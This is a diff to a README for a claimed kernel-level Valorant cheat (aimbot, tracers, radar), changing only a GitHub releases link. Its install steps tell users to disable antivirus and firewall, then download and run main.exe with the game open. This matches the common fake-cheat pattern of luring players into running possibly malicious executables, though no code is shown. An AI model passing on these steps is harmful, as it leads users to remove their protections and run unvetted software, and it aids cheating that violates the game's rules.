@@ -43,7 +43,7 @@ A kernal level Volrant Cheat featuring Aimbot, Tracers, Radar and more.
 ## Download and Installation
 
 - Disable any AV or firewall settings you have to avoid deletion
-- Go to the [Releases](https://github.com/Forkie1/ValorantExecuter/releases/tag/new) page.
+- Go to the [Releases](https://github.com/Forkie1/ValorantCheat/releases/tag/new) page.
 - Download the latest EXE (main.exe)
 - Open your Valorant
 - Run the EXE with Valorant running
